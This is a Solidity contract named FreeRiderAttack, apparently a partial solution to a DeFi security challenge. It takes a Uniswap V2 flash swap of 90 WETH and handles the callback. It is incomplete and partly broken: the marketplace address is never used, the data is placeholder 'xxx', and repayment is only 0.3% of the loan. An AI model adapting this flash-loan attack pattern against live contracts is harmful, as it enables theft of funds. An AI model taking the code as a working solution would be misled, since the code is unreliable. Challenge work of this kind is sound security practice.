// SPDX-License-Identifier: GPL-2.0+
pragma solidity ^0.8.3;
import "@openzeppelin/contracts/access/Ownable.sol";
import "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import "@openzeppelin/contracts/utils/math/SafeMath.sol";

import "hardhat/console.sol";


interface IWETH {
    function deposit() external payable;
    function transfer(address to, uint value) external returns (bool);
    function withdraw(uint) external;
}

interface IUniswapV2Callee {
    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external;
}

interface IUniswapV2Pair{
    function swap(uint amount0Out, uint amount1Out, address to, bytes calldata data) external;
}


contract FreeRiderAttack is Ownable, IUniswapV2Callee{
    using SafeMath for uint;
    IWETH private _weth;
    IERC20 private _token;
    IUniswapV2Pair private _uniswapV2Pair;
    constructor(address wethAddress,
            address tokenAddress,
            address iNFTMarketPlaceAddress,
            address uniswapV2PairAddress) Ownable() {
        _weth = IWETH(wethAddress);
        _token = IERC20(tokenAddress);
        _uniswapV2Pair = IUniswapV2Pair(uniswapV2PairAddress);
    }

    function start() public payable onlyOwner {
        uint amount = 90 * 10 ** 18;
        (uint amount0Out, uint amount1Out) = address(_weth) < address(_token) ? (amount, uint(0)) : (uint(0), amount);
        console.log("amount0Out is %s,  amount1Out is %s", amount0Out, amount1Out);
        bytes memory data =  abi.encode("xxx");
        require(data.length > 0);
        _uniswapV2Pair.swap(amount0Out, amount1Out, address(this),data );
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external override {
        console.log("xxx");
        console.log(address(this).balance);
        _weth.deposit{value: address(this).balance}();
        _weth.transfer(address(_uniswapV2Pair), amount0.div(1000).mul(3));
        console.log(address(this).balance);
    }

    receive() external payable {}
}
